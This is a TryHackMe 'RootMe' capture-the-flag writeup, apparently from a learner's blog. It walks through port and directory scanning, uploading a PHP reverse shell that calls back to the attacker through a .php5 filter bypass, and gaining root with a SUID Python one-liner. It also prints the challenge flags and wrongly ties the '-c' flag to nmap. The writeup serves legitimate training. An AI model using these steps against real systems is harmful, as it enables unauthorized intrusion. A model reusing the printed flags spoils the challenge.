# RootMe — TryHackMe Writeup

**Platform:** TryHackMe
**Difficulty:** Easy
**Category:** CTF
**Date:** June 28, 2026
**Flags:** `THM{y0u_g0t_a_sh3ll}` (user) · `THM{pr1v1l3g3_3sc4l4t10n}` (root)

---

## Summary

A Linux web server running an outdated Apache instance with a file upload form that doesn't properly validate uploaded files. Exploited the upload filter bypass to get a PHP reverse shell on the server, then escalated to root via a misconfigured SUID bit on Python 2.7.

---

## Reconnaissance

### Port Scan

Started with a fast full-port scan to see what's open:

```bash
sudo nmap -p- --min-rate 5000 -Pn 10.145.172.45
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Two ports. SSH and HTTP. HTTP is the attack surface — SSH requires credentials we don't have yet.

Followed up with a version scan to fingerprint what's running:

```bash
sudo nmap -sV -p- --min-rate 5000 -Pn 10.145.172.45
```

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

Apache 2.4.41 — released 2019, outdated. Worth noting but not the attack vector here.

### Directory Enumeration

```bash
gobuster dir -u http://10.145.172.45 -w /usr/share/wordlists/dirb/common.txt -t 50
```

```
/panel     (Status: 301)
/uploads   (Status: 301)
```

Two interesting paths. `/panel/` had a file upload form. `/uploads/` is where uploaded files land — this is the full attack path right there.

---

## Why a PHP Reverse Shell?

The version scan showed Apache serving PHP (`index.php` returned 200 in gobuster). When a web server is running PHP and has a file upload function, the goal is to upload a PHP file that the server will execute when you browse to it. PHP can run system commands — so a PHP reverse shell makes the server initiate a connection back to your listener, giving you code execution.

Apache processes `.php` files as code, not just serving them as downloads. That's the core of this vulnerability.

---

## Getting a Shell

### Setting Up the Reverse Shell

Kali ships with pre-built webshells at `/usr/share/webshells/`:

```bash
ls /usr/share/webshells/php/
# php-reverse-shell.php  php-backdoor.php  simple-backdoor.php ...
```

Copied the pentestmonkey reverse shell and edited two lines:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop/shell.php
nano ~/Desktop/shell.php
```

Changed:
```php
$ip = '192.168.128.123';   // tun0 VPN IP (ip addr show tun0)
$port = 4444;
```

### Starting the Listener

```bash
nc -lvnp 4444
```

Always start the listener before triggering the shell. The server needs somewhere to connect back to.

### Upload Filter Bypass

Tried uploading `shell.php` — the server rejected it with an error message (in Spanish — the app was filtering `.php` extensions).

Renamed the file:

```bash
mv shell.php shell.php5
```

Uploaded `shell.php5` — accepted. The filter was only checking for `.php` and didn't account for alternative PHP extensions like `.php5` and `.phtml` that Apache still executes as PHP.

### Triggering the Shell

Navigated to `http://10.145.172.45/uploads/` in the browser, found `shell.php5` listed there, clicked it. The server executed the file and the reverse shell connected back to the listener.

```
connect to [192.168.128.123] from (UNKNOWN) [10.145.172.45]
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We're in as `www-data` — the Apache service account.

---

## Post-Exploitation

### Shell Upgrade

The initial shell was dumb — no tab completion, no arrow keys, Ctrl+C kills it. Upgraded to a proper PTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z to background
stty raw -echo; fg
```

**Lesson learned:** The quotes around the Python code are required. Without them the shell interprets the semicolon as a command separator and the one-liner breaks. Always wrap the entire code block in single quotes.

### User Flag

```bash
find / -name user.txt 2>/dev/null
# /var/www/user.txt

cat /var/www/user.txt
# THM{y0u_g0t_a_sh3ll}
```

---

## Privilege Escalation

### Methodology

First check is always:

```bash
sudo -l
```

`www-data` had no sudo rights. Next check — SUID binaries.

### What is SUID?

SUID (Set User ID) is a Linux permission bit that makes an executable run as its **owner** rather than the user who launches it. Most SUID binaries are owned by root. That means if you can run them, they execute with root privileges — even as `www-data`.

This is a misconfiguration when it's set on something that shouldn't have it. Most standard SUID binaries (`sudo`, `passwd`, `su`) are expected and safe. The dangerous ones are programs that can spawn a shell or run arbitrary commands — because those shells inherit root's effective UID.

```bash
find / -user root -perm /4000 2>/dev/null
```

> Note: `/4000` specifically targets the SUID bit (4000 in octal). Equivalent to `-perm -u=s` but this is the syntax THM expects.

### The Finding

Scanning the output for anything unusual:

```
/usr/bin/python2.7
```

Python with SUID set is a critical misconfiguration. Python can execute arbitrary code and spawn shells. Since it runs as root via SUID, any shell it spawns is a root shell.

### Exploitation

From GTFOBins (`gtfobins.github.io`) — the reference for abusing privileged binaries:

```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

**What this does:**
- `import os` — loads the OS module
- `os.execl("/bin/sh", "sh", "-p")` — replaces the current process with `/bin/sh`
- `-p` flag — preserves the **effective UID**, which is root because of the SUID bit

```bash
# whoami
root
# id
uid=33(www-data) gid=33(www-data) euid=0(root)
```

`euid=0` — effective UID is root. That's what matters for privilege.

### Root Flag

```bash
find / -name root.txt 2>/dev/null
# /root/root.txt

cat /root/root.txt
# THM{pr1v1l3g3_3sc4l4t10n}
```

---

## Attack Chain

```
Nmap → two ports (22, 80)
  ↓
Gobuster → /panel/ (upload form) + /uploads/ (file storage)
  ↓
Apache running PHP → PHP reverse shell is the vector
  ↓
Upload filter bypass → .php blocked, .php5 accepted
  ↓
Browse to /uploads/shell.php5 → shell executes, connects back
  ↓
www-data shell → PTY upgrade
  ↓
sudo -l → nothing
  ↓
SUID scan → python2.7 has SUID bit set
  ↓
GTFOBins python SUID exploit → euid=0 (root)
  ↓
cat /root/root.txt → THM{pr1v1l3g3_3sc4l4t10n}
```

---

## What I Learned

- PHP extension filter bypasses — servers that block `.php` often miss `.php5`, `.phtml`, `.pHp`
- Always check `/uploads/` or equivalent after a successful upload — that's where execution happens
- PTY upgrade quotes matter — single quotes required around Python one-liners
- SUID privesc workflow: `find / -user root -perm /4000` → check output against GTFOBins → exploit
- `euid=0` after a SUID exploit means you have root's effective permissions even if `whoami` still shows `www-data`
- The `-c` flag in `os.execl` context: `-p` is the flag that matters here — it's the "privileged" flag for `/bin/sh` that tells the shell not to drop the elevated EUID

## What the `-c` Flag Actually Is

The `-c` in the nmap command (`-c 'import pty...'`) means **pass this string as code to execute**. It's a standard flag across Python, Bash, and other interpreters:

```bash
python3 -c 'print("hello")'   # run this Python code directly, no file needed
bash -c 'echo hello'          # run this bash code directly
```

It's how you run one-liners without creating a script file. The quotes are what tell the shell "treat everything inside as one argument."

---

## Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scanning and version detection |
| gobuster | Directory enumeration |
| php-reverse-shell.php | Pre-built Kali webshell (pentestmonkey) |
| netcat | Reverse shell listener |
| python3 pty | Shell upgrade to interactive PTY |
| GTFOBins | SUID exploitation reference |

## References

- GTFOBins Python: https://gtfobins.github.io/gtfobins/python/
- Pentestmonkey PHP reverse shell: /usr/share/webshells/php/php-reverse-shell.php
- PHP extension bypass list: https://book.hacktricks.xyz/pentesting-web/file-upload
